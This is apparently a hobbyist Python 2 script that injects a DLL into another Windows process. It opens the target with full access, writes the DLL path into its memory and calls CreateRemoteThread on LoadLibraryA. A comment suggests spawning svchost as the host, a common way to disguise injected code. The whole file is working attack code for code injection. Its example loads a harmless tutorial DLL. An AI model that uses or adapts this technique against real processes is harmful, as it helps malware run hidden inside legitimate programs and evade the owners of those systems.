'''vidyasagar'''
#1 Get process handle (by PID)

#2 allocate space for dll in that process

#3 write dll paths to process selected in step 1

#4 Resolve the function of kernel32.dll and LoadLibary funtion

#5 use info from 2,3,4 to call createRemotethread with specified dll

# inject the dll


from ctypes import *
import sys,ctypes

#Constants
PAGE_RW_PRI=0x04 
PROCESS_ALL_ACCESS= 0x1F0FFF
VIRTUAL_MEM=0x3000

kernel32 = windll.kernel32
def dllInjection(PID,dll_path):
    length_of_dll_path_string = len(dll_path)
    #to get handle of the process using process ID or PID
    print "PID is %d"%PID
    #'we can span the process tehn can add it also link spawn svchost is most common' 
    hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS,False,PID)
    if hProcess is None:
        print "unable to get process handle"
    print "allocating the space for path string in new process"
    DLL_PATH_ADDR = kernel32.VirtualAllocEx(hProcess,0,length_of_dll_path_string,VIRTUAL_MEM,PAGE_RW_PRI)
    bool_Written = c_int(0)
    kernel32.WriteProcessMemory(hProcess,DLL_PATH_ADDR,dll_path,length_of_dll_path_string,byref(bool_Written))
    print "resolving call specific funtin and library"
    kernel32dllHandler_addr = kernel32.GetModuleHandleA("kernel32")
    print "resolved kernel 32"
    LoadLibrary_func_addr = kernel32.GetProcAddress(kernel32dllHandler_addr,'LoadLibraryA')
    print "resolved LoadLibrary"

    threadid = c_ulong(0)
    #create thread
    if not kernel32.CreateRemoteThread(hProcess,None,0,LoadLibrary_func_addr,DLL_PATH_ADDR,0,byref(threadid)):
        print "injection failed"
        sys.exit(0)
    else:
        print "REMOTE thread is 0x%08xcreated " % threadid.value
    

PID = 1408
dll_path=" C:\masm32\tutorial\dlltute\dll\dlltute.dll"
dllInjection(PID,dll_path)



    
